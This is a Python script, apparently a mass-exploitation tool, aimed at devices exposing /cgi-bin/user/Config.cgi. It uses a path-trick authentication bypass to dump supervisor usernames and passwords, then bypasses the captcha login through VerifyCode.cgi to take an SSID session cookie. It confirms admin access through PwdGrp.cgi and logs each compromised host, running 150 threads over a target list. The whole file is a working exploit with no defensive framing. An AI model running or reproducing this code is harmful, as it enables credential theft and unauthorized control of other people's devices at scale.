import requests
import threading
import base64

R = threading.Lock()
R1 = threading.Lock()


def fopen():
    # R.acquire()
    f = open('suc1.txt', 'r')
    urls = f.readlines()
    # R.release()
    return urls


# url='http://'


def bs64encode(url):
    url1 = url + "/cgi-bin/user/Config.cgi?/nobody&action=get&category=Account.*"
    url2 = url + "/cgi-bin/user/Config.cgi?.cab&action=get&category=Account.*"
    ##requests请求时最好加timeout、verify参数
    bs64url_get = [url1, url2]
    usps_list = []
    try:
        for bs64url in bs64url_get:
            try:
                bs64_res = requests.get(bs64url, verify=False, timeout=15)
                if bs64_res.status_code == 200:
                    get_usps(bs64_res, usps_list)
                    if len(usps_list) == 0:
                        continue
                    # print(usps_list)
                    break
            except Exception as e:
                print(e)
            # get_usps(bs64_res)
    except Exception as e:
        print(e)
    return usps_list


def get_usps(bs64_res, usps_list):        ## 筛选获取账号密码
    if "Level=SUPERVISOR" in bs64_res.text and bs64_res.status_code == 200:
        poc = bs64_res.text
        num = 0
        while True:
            x = poc.find(".Level=SUPERVISOR", num)
            if x > 0:
                # b=poc.find("Username",u)
                o = poc.find("User", x - 10)
                c = poc[o + 4:x]  # 获取user_num
                user_star = poc.find("User" + c + ".Username=", num)
                user_end = poc.find("A", user_star)
                # user_end=
                user = poc[user_star + len("User" + c + ".Username="):user_end].strip()

                pwd_star = poc.find("User" + c + ".Password=", num)
                pwd_end = poc.find("A", pwd_star)
                pwd = poc[pwd_star + len("User" + c + ".Password="):pwd_end].strip()
                string = "\'\";:\\/"
                flag = False
                for s in string:
                    if s in pwd:
                        flag = True
                        break
                if not flag:
                    usps_list.append([user, pwd])

                num = x + len(".Level3=SUPERVISOR")
            else:
                print("我结束了")
                break


def get_u4(u4, header, expname, url):
    try:
        exp = requests.get(u4, headers=header, timeout=30)
        if exp.status_code == 200:
            R1.acquire()
            e = open(expname, 'a+')
            e.write(url + "\n")
            e.close()
            R1.release()
            print('success')
    except:
        pass


def login_req(urls):  ##登录验证码绕过
    while len(urls) > 0:
        R.acquire()
        url = urls[0]
        urls.pop(0)
        R.release()

        bs64_req = bs64encode(url)
        print("---------------------------------------")
        for uspwd in bs64_req:
            b64 = (base64.b64encode((uspwd[0] + ":" + uspwd[1]).encode("UTF-8"))).decode("UTF-8")
            usps_ok = 0
            ##判断b64是否为空
            try:
                r = requests.get(url, verify=False, timeout=30)
                if r.status_code == 200:
                    u1 = url + '/cgi-bin/nobody/VerifyCode.cgi?account=' + b64 + '&captcha_code=ZVFU&verify_code=ZVmHTLN5eiGB'
                    u2 = url + '/cgi-bin/nobody/VerifyCode.cgi?account=' + b64 + '&login=quick'
                    u3 = url + '/cgi-bin/nobody/VerifyCode.cgi?account=' + b64
                    u4 = url + '/cgi-bin/supervisor/PwdGrp.cgi'
                    url_list = [u1, u2]
                    if r.text.find('Verify Code :') >= 0:
                        for ur in url_list:
                            cookie = ""
                            req = requests.get(ur, verify=False, timeout=30)
                            if req.status_code == 200:
                                if req.text.lower().find("error") <= 0:
                                    cookie = req.cookies["SSID"]
                                    headerss = {
                                        "Cookie": "SSID=" + cookie
                                    }
                                    get_u4(u4, headerss, "PwdGrp.txt".format(i), url)  ##漏洞组合成功并写入
                                    usps_ok = 1
                                    break
                    else:
                        wyzm = requests.get(u3, verify=False, timeout=30)  ##无验证码的情况
                        if wyzm.text.lower().find("error") <= 0:
                            cookie3 = wyzm.cookies["SSID"]
                            headerss3 = {
                                "Cookie": "SSID=" + cookie3
                            }
                            if wyzm.status_code == 200:
                                get_u4(u4, headerss3, "PwdGrp.txt", url)  ##漏洞组合成功并写入
                                usps_ok = 1
            except Exception as e:
                print(e)
            if usps_ok == 1:
                break


if __name__ == "__main__":
    urls = fopen()
    ip_list = []
    for url in urls:
        url = url.strip()
        ip_list.append(url)

    xc = 150
    ipxc_list = []
    for i in range(xc):
        x = threading.Thread(target=login_req, args=(ip_list,))
        ipxc_list.append(x)
        x.start()
    for t in ipxc_list:
        t.join()
